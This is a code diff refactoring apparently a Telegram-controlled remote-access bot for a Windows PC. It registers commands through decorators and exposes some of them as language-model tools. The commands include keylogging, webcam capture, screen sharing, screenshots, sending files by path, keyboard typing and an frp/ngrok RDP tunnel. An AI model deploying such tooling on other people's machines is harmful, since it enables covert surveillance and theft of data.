@@ -1,4 +1,5 @@
 import asyncio
+import inspect
 import aiofiles
 import socket
 import pyautogui
@@ -40,6 +41,54 @@ if os.getenv("CHAT_BOT_ENABLED") != "False":
         agent_system_prompt,
     )
     from models.tool_context import ToolContext
+import os
+
+# Module-level dictionaries and decorator for command registration
+_command_handlers = {}
+_confirmation_messages = {}
+_tool_configs = []
+
+
+def command(name, confirmation=None):
+    """
+    Decorator to register a command handler method under the given command name.
+
+    Args:
+        name (str): The command name to register the method under.
+        confirmation (str, optional): The confirmation message for this command.
+
+    Returns:
+        function: Decorator function that registers the method.
+    """
+
+    def decorator(func):
+        _command_handlers[name] = func
+        if confirmation:
+            _confirmation_messages[name] = confirmation
+        return func
+
+    return decorator
+
+
+def llm_tool(command, description, args_map=None, return_msg="Done"):
+    """Decorator to register a method as an LLM tool"""
+
+    def decorator(func):
+        # Extract command name from function name
+        sig = inspect.signature(func)
+        has_is_ai = "is_ai" in sig.parameters
+        _tool_configs.append(
+            {
+                "add_is_ai_flag": has_is_ai,
+                "command": command,
+                "description": description,
+                "args_map": args_map or {},
+                "return_msg": return_msg,
+            }
+        )
+        return func
+
+    return decorator
 
 
 class Features:
@@ -75,6 +124,10 @@ class Features:
         video_State: State of the video.
         language_model: Language model pipeline for text generation.
     """
+
+    command_handlers = _command_handlers
+    confirmation_messages = _confirmation_messages
+    _tool_configs = _tool_configs
 
     def __init__(self, telegram_bot):
         """
@@ -117,6 +170,10 @@ class Features:
         self.pending = 0
         self.logging = False
         self.logger = 0
+        self.frpc = FrpcWrapper(
+            config_path="C:\\Users\\Admin\\Downloads\\frp_0.69.0_windows_amd64\\frp_0.69.0_windows_amd64\\frpc.toml",
+            binary_path="C:\\Users\\Admin\\Downloads\\frp_0.69.0_windows_amd64\\frp_0.69.0_windows_amd64\\frpc.exe",
+        )
         self.telegram_bot = telegram_bot
         self.scheduler_manager = None
         file_found = False
@@ -164,42 +221,13 @@ class Features:
             "Remote Desktop": "rdp",
             "NLP State": "nlp",
         }
+        # Bind class-level command handlers to this instance
         self.command_handlers = {
-            "send": self.send,
-            "video": self.video,
-            "screen": self.screen,
-            "types": self.keyboard_type,
-            "speak": self.speak,
-            "screenshot": self.take_screenshot,
-            "stop": self.kill_task,
-            "photo": self.take_photo,
-            "keylog": self.key_logger,
-            "chat": self.run_language_model,
-            "list": self.list_users,
-            "kick": self.kick_user,
-            "rdp": self.start_stop_rdp_tunnel,
-            "nlp": self.set_nlp_flag_async,
-            "clear_history": self.clear_history,
-            "remind": self.schedule_reminder,
-            "list_reminders": self.list_reminders,
-            "delete_reminder": self.delete_reminder,
-            "schedule_reminder": self.schedule_reminder,
+            name: fn.__get__(self, type(self))
+            for name, fn in Features.command_handlers.items()
         }
-        self._commmand_confrimation_msg = {
-            "send": "did you mean to send a document?",
-            "video": "did you mean to start/stop video streaming?",
-            "screen": "did you mean to start/stop screen sharing?",
-            "types": "did you mean to type the given text?",
-            "speak": "did you mean to convert text to speech?",
-            "screenshot": "did you mean to take a screenshot?",
-            "stop": "did you mean to stop a task?",
-            "photo": "did you mean to take a photo?",
-            "keylog": "did you mean to start/stop key logging?",
-            "chat": "did you mean to chat with the AI?",
-            "list": "did you mean to list all authorized users?",
-            "kick": "did you mean to kick an authorized user?",
-            "rdp": "did you mean to start/stop RDP tunnel?",
-        }
+        # Bind class-level confirmation messages to instance
+        self._commmand_confrimation_msg = dict(Features.confirmation_messages)
 
         ngrok.set_auth_token(self.ngrok_token)
 
@@ -246,6 +274,7 @@ class Features:
             )
         return system_status_messages
 
+    @command("nlp", confirmation="")
     async def set_nlp_flag_async(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -284,6 +313,13 @@ class Features:
     def set_scheduler_manager(self, scheduler_manager):
         self.scheduler_manager = scheduler_manager
 
+    @llm_tool(
+        "remind",
+        "Schedule a reminder for a future time.",
+        args_map={"text": "natural_language_input"},
+        return_msg="Reminder scheduled at",
+    )
+    @command("remind", confirmation="")
     async def schedule_reminder(
         self,
         chat_id,
@@ -337,6 +373,7 @@ class Features:
             ),
         )
 
+    @command("list_reminders", confirmation="")
     async def list_reminders(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -364,6 +401,7 @@ class Features:
             )
         await context.bot.send_message(chat_id=chat_id, text="\n".join(lines))
 
+    @command("delete_reminder", confirmation="")
     async def delete_reminder(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -383,7 +421,6 @@ class Features:
         await context.bot.send_message(
             chat_id=chat_id, text=f"Deleted reminder {reminder_id}."
         )
-
 
     async def live_server(self, chat_id, first_name, last_name, context):
         """
@@ -424,6 +461,13 @@ class Features:
             self.server_thread_state = "ON"
         return None
 
+    @llm_tool(
+        "send",
+        "Send a file to the user by path",
+        args_map={"text": "path"},
+        return_msg="File sent",
+    )
+    @command("send", confirmation="did you mean to send a document?")
     async def send(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -441,6 +485,10 @@ class Features:
         fp = command[len(command_list[0]) + 1 :]
         await context.bot.send_document(chat_id=chat_id, document=open(fp, "rb"))
 
+    @llm_tool(
+        "video", "Start or stop webcam streaming", return_msg="Video streaming toggled"
+    )
+    @command("video", confirmation="did you mean to start/stop video streaming?")
     async def video(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -483,6 +531,10 @@ class Features:
                     text="Cannot stop server as other services are running on the server",
                 )
 
+    @llm_tool(
+        "screen", "Start or stop screen sharing", return_msg="Screen sharing toggled"
+    )
+    @command("screen", confirmation="did you mean to start/stop screen sharing?")
     async def screen(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -699,6 +751,7 @@ class Features:
         self.file_message_id = "aa"
         return True, text
 
+    @command("speak", confirmation="did you mean to convert text to speech?")
     async def speak(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -734,6 +787,12 @@ class Features:
         self.fname = ""
         self.file_message_id = "aa"
 
+    @llm_tool(
+        "screenshot",
+        "Take a screenshot and send it to the user",
+        return_msg="Screenshot taken and sent",
+    )
+    @command("screenshot", confirmation="did you mean to take a screenshot?")
     async def take_screenshot(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -755,6 +814,7 @@ class Features:
         os.remove("screen.png")
         return "Screenshot taken and sent"
 
+    @command("stop", confirmation="did you mean to stop a task?")
     async def kill_task(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -778,6 +838,13 @@ class Features:
             message = "Invalid command"
         await context.bot.send_message(chat_id=chat_id, text=message)
 
+    @llm_tool(
+        "types",
+        "Type text on the system keyboard",
+        args_map={"text": "text"},
+        return_msg="Text typed",
+    )
+    @command("types", confirmation="did you mean to type the given text?")
     async def keyboard_type(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -797,6 +864,7 @@ class Features:
         print(f"typed {command[len(command_list[0])+1:]}")
         return "typed text with keyboard controller"
 
+    @command("photo", confirmation="did you mean to take a photo?")
     async def take_photo(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -834,6 +902,7 @@ class Features:
             )
             return "failed to capture image"
 
+    @command("keylog", confirmation="did you mean to start/stop key logging?")
     async def key_logger(
         self, chat_id, command, command_list, first_name, last_name, context
     ):
@@ -1130,6 +1199,7 @@ here is log""",
             )
             self.nlp_classifier_output[chat_id] = {}
 
+    @command("chat", confirmation="did you mean to chat with the AI?")
     async def run_language_model(
         self,
         chat_id,
@@ -1302,6 +1372,12 @@ here is log""",
             text = text.replace(char, f"\\{char}")
         return text
 
+    @llm_tool(
+        "list",
+        "Get the list of authorized users",
+        return_msg="Authorized users list sent",
+    )
+    @command("list", confirmation="did you mean to list all authorized users?")
     async def list_users(
         self, chat_id, command, list_command, first_name, last_name, context
     ):
@@ -1338,6 +1414,13 @@ here is log""",
         )
         return "list sent to user"
 
+    @llm_tool(
+        "kick",
+        "Remove user from the system",
+        args_map={"text": "chat_id"},
+        return_msg="User removed",
+    )
+    @command("kick", confirmation="did you mean to kick an authorized user?")
     async def kick_user(
         self, chat_id, command, list_command, first_name, last_name, context
     ):
@@ -1394,6 +1477,8 @@ here is log""",
             )
             return "User not found in the authorized list."
 
+    @llm_tool("rdp", "Toggle RDP tunnel on or off", return_msg="RDP tunnel toggled")
+    @command("rdp", confirmation="did you mean to start/stop RDP tunnel?")
     async def start_stop_rdp_tunnel(
         self, chat_id, command, list_command, first_name, last_name, context
     ):
